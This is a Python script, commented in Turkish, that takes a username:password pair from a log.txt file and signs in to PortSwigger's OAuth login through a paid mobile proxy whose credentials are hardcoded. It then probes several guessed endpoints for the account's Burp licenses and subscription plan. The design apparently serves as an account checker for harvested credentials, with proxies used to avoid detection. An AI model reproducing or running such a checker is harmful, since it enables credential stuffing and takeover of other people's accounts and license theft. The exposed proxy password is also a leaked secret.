#!/usr/bin/env python3
"""Quick endpoint test for a single account"""

import requests
import json
from urllib.parse import urljoin, parse_qs, urlparse

proxy_url = "http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029"

# log.txt'den ilk hesabı oku
with open("log.txt", 'r', encoding='utf-8') as f:
    for line in f:
        line = line.strip()
        if line and not line.startswith("#"):
            username, password = line.split(":", 1)
            username = username.strip()
            password = password.strip()
            break

print(f"[*] Test hesabı: {username}\n")

# Session oluştur
session = requests.Session()
session.headers.update({'User-Agent': 'PortSwigger-Test/1.0'})
session.proxies.update({'http': proxy_url, 'https': proxy_url})

# Step 1: Authorization
print("[1] OAuth Authorization...")
auth_url = "https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"

try:
    resp = session.get(auth_url, allow_redirects=False, timeout=10)
    print(f"    Status: {resp.status_code}")

    # State'i çıkart
    state = ""
    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if redirect_url and 'state=' in redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            parsed = parse_qs(urlparse(redirect_url).query)
            if 'state' in parsed:
                state = parsed['state'][0]
            resp = session.get(redirect_url, allow_redirects=False, timeout=10)
except Exception as e:
    print(f"    Hata: {e}")

# Step 2: Login
print("\n[2] Login...")
login_url = f"https://login.portswigger.net/u/login"
if state:
    login_url = f"{login_url}?state={state}"

login_data = {
    "username": username,
    "password": password,
    "action": "default"
}

try:
    resp = session.post(login_url, data=login_data, allow_redirects=False, timeout=10)
    print(f"    Status: {resp.status_code}")

    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            resp = session.get(redirect_url, allow_redirects=True, timeout=10)

    print(f"    Cookies: {len(session.cookies)} tane")
    if len(session.cookies) > 0:
        print("    [✓] Giriş başarılı")
    else:
        print("    [✗] Giriş başarısız")
except Exception as e:
    print(f"    Hata: {e}")

# Step 3: Endpoint Testleri
print("\n[3] Endpoint Testleri:")
print("=" * 80)

endpoints = [
    f"https://portswigger.net/users/{username}/licenses",
    f"https://portswigger.net/user/{username}/licenses",
    f"https://portswigger.net/users/{username.split('@')[0]}/licenses",
    f"https://portswigger.net/api/users/{username}/licenses",
    f"https://portswigger.net/api/subscription",
    f"https://portswigger.net/api/user/plan",
    f"https://portswigger.net/account/plan",
    f"https://portswigger.net/subscriptions",
    f"https://portswigger.net/account/subscriptions",
    f"https://portswigger.net/user/subscriptions",
]

for url in endpoints:
    try:
        resp = session.get(url, headers={"Accept": "application/json"}, allow_redirects=True, timeout=10)

        status_color = "✓" if resp.status_code == 200 else "✗"
        print(f"\n[{status_color}] {url}")
        print(f"    Status: {resp.status_code}")

        if resp.status_code == 200:
            try:
                data = resp.json()
                print(f"    Response (JSON): {json.dumps(data, indent=2)[:200]}...")
            except:
                print(f"    Response (Text): {resp.text[:200]}...")
        else:
            print(f"    Response: {resp.text[:100]}...")
    except Exception as e:
        print(f"\n[✗] {url}")
        print(f"    Hata: {e}")

print("\n" + "=" * 80)
print("[*] Test tamamlandı")
